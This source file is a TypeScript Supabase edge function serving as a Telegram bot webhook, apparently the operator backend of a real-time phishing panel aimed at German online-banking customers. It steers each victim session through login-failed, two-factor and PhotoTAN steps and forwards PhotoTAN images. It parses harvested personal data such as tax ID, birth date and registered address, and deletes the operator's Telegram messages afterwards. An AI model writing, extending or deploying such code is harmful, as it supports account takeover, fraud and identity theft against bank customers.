import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { tgCall, deriveWebhookSecret, sessionKeyboard, formatSessionText } from "../_shared/telegram.ts";

function safeEqual(a: string | null, b: string): boolean {
  if (!a || a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

const PROFILE_ALIASES: Record<string, string> = {
  "titel": "titel", "title": "titel", "anrede": "titel",
  "vorname": "vorname", "firstname": "vorname", "first name": "vorname",
  "weitere vornamen": "weitereVornamen", "middle name": "weitereVornamen",
  "nachname": "nachname", "name": "nachname", "lastname": "nachname", "last name": "nachname", "surname": "nachname",
  "geburtsdatum": "geburtsdatum", "geburtstag": "geburtsdatum", "birthday": "geburtsdatum", "dob": "geburtsdatum",
  "geburtsort": "geburtsort", "birthplace": "geburtsort",
  "staat": "staat", "staatsangehörigkeit": "staat", "staatsangehoerigkeit": "staat", "nationality": "staat",
  "weitere staatsangehörigkeiten": "weitereStaat", "weitere staatsangehoerigkeiten": "weitereStaat",
  "familienstand": "familienstand", "marital": "familienstand",
  "steuer-id": "steuerId", "steuerid": "steuerId", "steuer id": "steuerId", "tax id": "steuerId",
  "mobil": "mobil", "mobilfunk": "mobil", "handy": "mobil", "mobile": "mobil", "telefon": "mobil", "phone": "mobil",
  "mobilfunknummer": "mobil", "private mobilfunknummer": "mobil",
  "festnetz": "festnetz", "landline": "festnetz", "festnetznummer": "festnetz", "private festnetznummer": "festnetz",
  "email": "email", "e-mail": "email", "e-mail-adresse": "email", "mail": "email",
  "private e-mail-adresse": "email", "private email": "email", "private e-mail": "email",
  "straße": "strasse", "strasse": "strasse", "street": "strasse", "adresse": "strasse", "address": "strasse",
  "straße und hausnummer": "strasse", "strasse und hausnummer": "strasse",
  "adresszusatz": "zusatz", "zusatz": "zusatz",
  "plz": "plz", "postleitzahl": "plz", "zip": "plz", "postcode": "plz",
  "ort": "ortLand", "ort und land": "ortLand", "stadt": "ortLand", "city": "ortLand",
  "erwerb": "erwerb", "erwerbstätigkeit": "erwerb", "erwerbstaetigkeit": "erwerb", "beschäftigung": "erwerb",
  "berufsgruppe": "berufsgruppe",
  "fachrichtung": "fachrichtung",
  "stellung": "stellung", "stellung im unternehmen": "stellung", "position": "stellung",
};

const SECTION_HEADERS = new Set([
  "persönliche angaben", "persoenliche angaben",
  "private kontaktinformationen",
  "meldeadresse",
  "berufliche angaben",
  "bearbeiten",
]);

function parseProfileText(raw: string): Record<string, string> {
  const out: Record<string, string> = {};
  const lines = raw.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);

  // First try inline "key: value" format
  let inlineHits = 0;
  for (const line of lines) {
    const m = line.match(/^([^:：]+)[:：]\s*(.+)$/);
    if (!m) continue;
    const key = m[1].trim().toLowerCase();
    const val = m[2].trim();
    const target = PROFILE_ALIASES[key];
    if (target) {
      out[target] = val;
      inlineHits++;
    }
  }
  if (inlineHits >= 3) return out;

  // Fallback: label line followed by value line
  const filtered = lines.filter((l) => !SECTION_HEADERS.has(l.toLowerCase()));
  for (let i = 0; i < filtered.length - 1; i++) {
    const key = filtered[i].toLowerCase().replace(/[:：]$/, "").trim();
    const target = PROFILE_ALIASES[key];
    if (!target) continue;
    const val = filtered[i + 1].trim();
    // Skip if next line is also a known label (means current label had no value)
    if (PROFILE_ALIASES[val.toLowerCase()]) continue;
    out[target] = val;
    i++; // consume value
  }
  return out;
}

Deno.serve(async (req) => {
  if (req.method !== "POST") return new Response("Method not allowed", { status: 405 });

  const expected = await deriveWebhookSecret();
  const got = req.headers.get("X-Telegram-Bot-Api-Secret-Token");
  if (!safeEqual(got, expected)) return new Response("Unauthorized", { status: 401 });

  const supabase = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
  );

  const update = await req.json().catch(() => null);
  if (!update) return new Response(JSON.stringify({ ok: true }));

  const trackExtra = async (chatId: number | string, messageId: number | null) => {
    if (!messageId) return;
    const { data: latest } = await supabase
      .from("sessions")
      .select("id, extra_message_ids, tg_message_id")
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();
    if (!latest) return;
    const ids = Array.isArray(latest.extra_message_ids) ? latest.extra_message_ids : [];
    await supabase.from("sessions")
      .update({ extra_message_ids: [...ids, messageId] })
      .eq("id", latest.id);
  };

  try {
    const msg = update.message ?? update.edited_message;

    // Handle photo replies: attach as PhotoTAN image to matching session
    if (msg?.photo && Array.isArray(msg.photo) && msg.photo.length > 0) {
      const replyTo = msg.reply_to_message?.message_id;
      let session: any = null;
      if (replyTo) {
        const { data } = await supabase
          .from("sessions")
          .select("id, mode, phase, action, meta, tg_message_id, extra_message_ids")
          .eq("tg_message_id", replyTo)
          .maybeSingle();
        session = data;
      }
      if (!session) {
        const { data } = await supabase
          .from("sessions")
          .select("id, mode, phase, action, meta, tg_message_id, extra_message_ids")
          .in("phase", ["phototan_requested", "aenderung_phototan_requested"])
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();
        session = data;
      }
      if (session) {
        const largest = msg.photo[msg.photo.length - 1];
        const { json: fileJson } = await tgCall("getFile", { file_id: largest.file_id });
        const filePath = fileJson?.result?.file_path;
        if (filePath) {
          const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY")!;
          const TELEGRAM_API_KEY = Deno.env.get("TELEGRAM_API_KEY")!;
          const dl = await fetch(`https://connector-gateway.lovable.dev/telegram/file/${filePath}`, {
            headers: {
              Authorization: `Bearer ${LOVABLE_API_KEY}`,
              "X-Connection-Api-Key": TELEGRAM_API_KEY,
            },
          });
          if (dl.ok) {
            const buf = new Uint8Array(await dl.arrayBuffer());
            let bin = "";
            for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
            const b64 = btoa(bin);
            const mime = filePath.toLowerCase().endsWith(".png") ? "image/png" : "image/jpeg";
            const dataUrl = `data:${mime};base64,${b64}`;
            const nextMeta = { ...(session.meta || {}), photoTanImage: dataUrl };
            const { data: updated } = await supabase
              .from("sessions")
              .update({ meta: nextMeta })
              .eq("id", session.id)
              .select("id, mode, phase, action, meta, tg_message_id")
              .single();
            if (updated?.tg_message_id) {
              await tgCall("editMessageText", {
                chat_id: msg.chat.id,
                message_id: updated.tg_message_id,
                text: formatSessionText(updated as any) + "\n\n📸 <b>PhotoTAN Bild gesendet</b>",
                parse_mode: "HTML",
                reply_markup: sessionKeyboard(updated.id, updated.mode),
              });
            }

            // Cleanup: delete operator's photo and any tracked prompts/reply extras
            const toDelete = new Set<number>([msg.message_id, ...(session.extra_message_ids || [])]);
            for (const mid of toDelete) {
              try {
                await tgCall("deleteMessage", { chat_id: msg.chat.id, message_id: mid });
              } catch (deleteError) {
                console.error("telegram photo cleanup failed", mid, deleteError);
              }
            }
            // Clear extras so we don't try to delete them again
            await supabase.from("sessions").update({ extra_message_ids: [] }).eq("id", session.id);

            return new Response(JSON.stringify({ ok: true }));
          }
        }
      }
    }

    if (msg?.text && typeof msg.text === "string") {
      const raw = msg.text.trim();
      const firstToken = raw.split(/\s+/)[0].split("@")[0].toLowerCase();
      const modeMap: Record<string, string> = {
        "/live": "live",
        "/live_change": "live_change",
        "/afk": "afk",
      };
      if (firstToken in modeMap) {
        const mode = modeMap[firstToken];
        const { data: settings } = await supabase
          .from("api_settings").select("id").limit(1).maybeSingle();
        if (settings?.id) {
          await supabase.from("api_settings").update({ flow_mode: mode }).eq("id", settings.id);
        }
        const { json } = await tgCall("sendMessage", {
          chat_id: msg.chat.id,
          text: `Flow-Mode gesetzt: <b>${mode}</b>`,
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id,
        });
        await trackExtra(msg.chat.id, msg.message_id);
        await trackExtra(msg.chat.id, json?.result?.message_id ?? null);
        return new Response(JSON.stringify({ ok: true }));
      }

      // Non-command text: treat as reply providing e.g. device name.
      const replyTo = msg.reply_to_message?.message_id;
      {
        // Match replies to the main message/prompt. Telegram clients may also send the
        // device name as a normal message, so fall back to the latest pending prompt.
        let session: any = null;
        if (replyTo) {
          {
            const { data } = await supabase
              .from("sessions")
              .select("id, mode, phase, action, meta, tg_message_id, extra_message_ids")
              .eq("tg_message_id", replyTo)
              .maybeSingle();
            session = data;
          }
          if (!session) {
            const { data } = await supabase
              .from("sessions")
              .select("id, mode, phase, action, meta, tg_message_id, extra_message_ids")
              .contains("extra_message_ids", [replyTo])
              .order("created_at", { ascending: false })
              .limit(1)
              .maybeSingle();
            session = data;
          }
        }
        if (!session) {
          const { data } = await supabase
            .from("sessions")
            .select("id, mode, phase, action, meta, tg_message_id, extra_message_ids")
            .in("mode", ["live", "live_change"])
            .order("created_at", { ascending: false })
            .limit(1)
            .maybeSingle();
          session = data;
        }
        if (session) {
          const isProfilePhase = session.phase === "profil_abruf";
          const isPushForAenderung =
            session.phase === "aenderung_phototan_requested" &&
            raw.trim().toLowerCase() === "push";
          let nextMeta: Record<string, any>;
          let updates: Record<string, any> = { extra_message_ids: [] };
          const prevNotes = Array.isArray(session.meta?.notes) ? session.meta.notes : [];
          const noteEntry = { text: raw, at: new Date().toISOString(), phase: session.phase };

          if (isPushForAenderung) {
            nextMeta = { ...(session.meta || {}), photoTanImage: "push", notes: [...prevNotes, noteEntry] };
            updates = { ...updates, meta: nextMeta };
          } else if (isProfilePhase) {
            const profile = parseProfileText(raw);
            if (Object.keys(profile).length === 0) {
              nextMeta = { ...(session.meta || {}), notes: [...prevNotes, noteEntry] };
              updates = { ...updates, meta: nextMeta };
            } else {
              nextMeta = { ...(session.meta || {}), profile, profileRaw: raw, notes: [...prevNotes, noteEntry] };
              updates = { ...updates, meta: nextMeta, action: "profile_received" };
            }
          } else {
            nextMeta = { ...(session.meta || {}), deviceName: raw, notes: [...prevNotes, noteEntry] };
            updates = { ...updates, meta: nextMeta };
          }

          const { data: updated } = await supabase
            .from("sessions")
            .update(updates)
            .eq("id", session.id)
            .select("id, mode, phase, action, meta, tg_message_id")
            .single();

          // Update main session message
          if (updated?.tg_message_id) {
            await tgCall("editMessageText", {
              chat_id: msg.chat.id,
              message_id: updated.tg_message_id,
              text: formatSessionText(updated as any),
              parse_mode: "HTML",
              reply_markup: sessionKeyboard(updated.id, updated.mode),
            });
          }

          // Delete operator's reply and any tracked extras (incl. the prompt)
          const toDelete = new Set<number>([msg.message_id, ...(session.extra_message_ids || [])]);
          for (const mid of toDelete) {
            try {
              await tgCall("deleteMessage", { chat_id: msg.chat.id, message_id: mid });
            } catch (deleteError) {
              console.error("telegram cleanup failed", mid, deleteError);
            }
          }
          return new Response(JSON.stringify({ ok: true }));
        }
      }

      // Untracked text — remember its id so we can clean it later
      await trackExtra(msg.chat.id, msg.message_id);
    }

    // Button callbacks
    const cb = update.callback_query;
    if (cb?.data) {
      const [action, sessionId] = String(cb.data).split("|");

      if ((action === "captcha_ok" || action === "captcha_no") && sessionId) {
        const now = new Date().toISOString();
        const patch = action === "captcha_ok"
          ? { released_at: now, slider_released_at: now, rejected_at: null }
          : { rejected_at: now, released_at: null, slider_released_at: null };
        await supabase.from("captcha_requests").update(patch).eq("id", sessionId);
        await tgCall("answerCallbackQuery", {
          callback_query_id: cb.id,
          text: action === "captcha_ok" ? "Freigegeben" : "Abgelehnt",
        });
        if (cb.message?.chat?.id && cb.message?.message_id) {
          const suffix = action === "captcha_ok" ? "\n\n✅ <b>Freigegeben</b>" : "\n\n❌ <b>Abgelehnt</b>";
          const orig = cb.message.text || cb.message.caption || "";
          try {
            await tgCall("editMessageText", {
              chat_id: cb.message.chat.id,
              message_id: cb.message.message_id,
              text: orig + suffix,
              parse_mode: "HTML",
            });
          } catch {}
        }
        return new Response(JSON.stringify({ ok: true }));
      }

      const allowed = new Set(["success", "twofa", "login_failed", "live_change", "phototan_wrong", "phototan_success", "finish", "finish_wrong"]);
      if (allowed.has(action) && sessionId) {
        const { data: updated } = await supabase
          .from("sessions")
          .update({ action })
          .eq("id", sessionId)
          .select("id, mode, phase, action, meta, tg_message_id")
          .maybeSingle();

        await tgCall("answerCallbackQuery", {
          callback_query_id: cb.id,
          text: `→ ${action}`,
        });

        if (updated && cb.message?.chat?.id) {
          await tgCall("editMessageText", {
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            text: formatSessionText(updated as any),
            parse_mode: "HTML",
            reply_markup: sessionKeyboard(updated.id, updated.mode),
          });
        }
      }
    }
  } catch (e) {
    console.error("webhook handler error", e);
  }

  return new Response(JSON.stringify({ ok: true }));
});
